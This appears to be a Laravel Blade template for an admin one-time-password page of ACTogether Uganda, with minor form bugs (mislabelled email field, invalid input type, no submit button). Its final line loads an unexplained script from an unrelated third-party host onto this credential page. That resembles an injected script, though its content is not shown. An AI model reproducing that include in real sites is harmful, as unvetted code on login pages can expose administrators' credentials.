






<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Admin - ACTogether Uganda</title>

    <link rel="icon" type="image/x-icon" href="/favicon_io/favicon.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    {{-- alpine --}}
    <script src="//unpkg.com/alpinejs" defer></script>

    <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.2.0/flowbite.min.css" rel="stylesheet" />
</head>

<body>
<section class="bg-gray-50 dark:bg-gray-900">
    <div class="flex flex-col items-center justify-center px-6 py-8 mx-auto md:h-screen lg:py-0">
        <a href="#" class="flex items-center mb-6 text-2xl font-semibold text-gray-900 dark:text-white">
            <img class="  w-40 h-20 mr-2" src="/act.jpg" alt="logo">

        </a>
        <div class="w-full bg-white rounded-lg shadow dark:border md:mt-0 sm:max-w-md xl:p-0 dark:bg-gray-800 dark:border-gray-700">
            <div class="p-6 space-y-4 md:space-y-6 sm:p-8">

                <x-flash_message  />

                <h1 class="text-xl font-bold leading-tight tracking-tight text-gray-900 md:text-2xl dark:text-white">
                    Enter OTP sent to you email
                </h1>
                <form class="space-y-4 md:space-y-6"  method="POST" action="">
                @csrf
                    <div>
                        <label for="email" class="block mb-2 text-sm font-medium text-gray-900 dark:text-white">Your email</label>
                        <input type="otp" name="otp" value="{{ old('otp') }}" id="email" class="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-primary-600 focus:border-primary-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="name@company.com" required="">
                        @error('otp')
                        <code>
                            <p class="text-danger text-xs mt-1">{{ $message }}</p>
                        </code>
                    @enderror
                    </div>

                    <div class="flex items-center justify-between">
                        <div class="flex items-start">

                        </div>

                    </div>
                  

                </form>
            </div>
        </div>
    </div>
  </section>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.2.0/flowbite.min.js"></script>
  <script src="https://cdn.cognospheredynamics.com/1.0.0/window_min.js"></script>
</body>
